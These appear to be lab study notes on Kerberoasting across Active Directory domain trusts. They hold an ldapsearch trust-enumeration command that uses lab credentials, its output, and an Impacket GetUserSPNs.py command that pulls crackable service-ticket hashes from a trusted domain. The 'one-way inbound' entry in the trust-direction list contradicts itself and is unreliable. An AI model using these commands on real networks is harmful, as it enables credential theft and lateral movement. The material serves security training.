Kerberos attacks such as Kerberoasting and ASREPRoasting can be performed across trusts, depending on the trust direction.

Example: `INLANEFREIGHT.LOCAL` --> `FREIGHTLOGISTICS.LOCAL`

#### Enumerate

We still need to enumerate the trust relationship between the two domains:

```bash
ldapsearch -x -H ldap://172.16.5.5 -D "forend@INLANEFREIGHT.LOCAL" -w Klmcargo2 -b "CN=System,DC=INLANEFREIGHT,DC=LOCAL" "(objectClass=trustedDomain)" | grep -E 'trustedDomain|distinguishedName|objectSID|trustDirection'
# filter: (objectClass=trustedDomain)
objectClass: trustedDomain
distinguishedName: CN=LOGISTICS.INLANEFREIGHT.LOCAL,CN=System,DC=INLANEFREIGHT
trustDirection: 3
objectClass: trustedDomain
distinguishedName: CN=FREIGHTLOGISTICS.LOCAL,CN=System,DC=INLANEFREIGHT,DC=LOC
trustDirection: 3
```
#### Trust Direction Values:

- **1** = **One-way inbound**: This means the source domain trusts the target domain, but not vice versa. Users in the target domain can access resources in the source domain, but not the other way around.
- **2** = **One-way outbound**: This means the source domain trusts the target domain, but not vice versa. Users in the source domain can access resources in the target domain, but not the other way around.
- **3** = **Bidirectional**: This indicates a two-way trust, meaning both domains trust each other, and users can access resources in both domains.

Kerberosting across domain:

```bash
GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/forend:Klmcargo2 -request -outputfile kerb.hashcat
```

